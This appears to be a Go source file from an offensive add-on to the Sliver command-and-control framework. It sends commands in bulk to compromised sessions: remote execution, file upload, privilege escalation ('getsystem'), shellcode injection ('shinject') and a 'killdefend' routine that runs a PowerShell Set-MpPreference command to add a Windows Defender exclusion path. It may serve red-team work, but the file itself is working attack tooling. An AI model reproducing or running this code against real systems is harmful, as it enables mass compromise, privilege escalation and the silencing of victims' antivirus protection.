package client_cmds

import (
	"sliver-dispatch/client_cmds/dispatch"
	"sliver-dispatch/utils"
	"strings"

	"github.com/bishopfox/sliver/protobuf/rpcpb"
)

func RunMass(rpc rpcpb.SliverRPCClient, args ...string) {

	utils.Dprint("Command: %s", args[0])
	for idx, arg := range args[0:] {
		utils.Dprint("Arg %d: %s", idx, arg)
	}
	if len(args) < 2 {
		utils.Eprint("Missing arguments!")
		return
	}
	switch strings.ToLower(args[0]) {
	case "execute":
		dispatch.Execute(rpc, args[1:]...)
	case "upload":
		dispatch.Upload(rpc, args[1:]...)
	case "nosferatu":
		dispatch.Nosferatu(rpc, args[1:]...)
	case "getsystem":
		dispatch.GetSystem(rpc, args[1:]...)
	case "shinject":
		dispatch.Shinject(rpc, args[1:]...)
	case "killdefend":
		dispatch.Execute(rpc, []string{"cmd.exe", "/c", "powershell", "-c", "set-mppreference", "-exclusionpath", args[1]}...)
	}

}
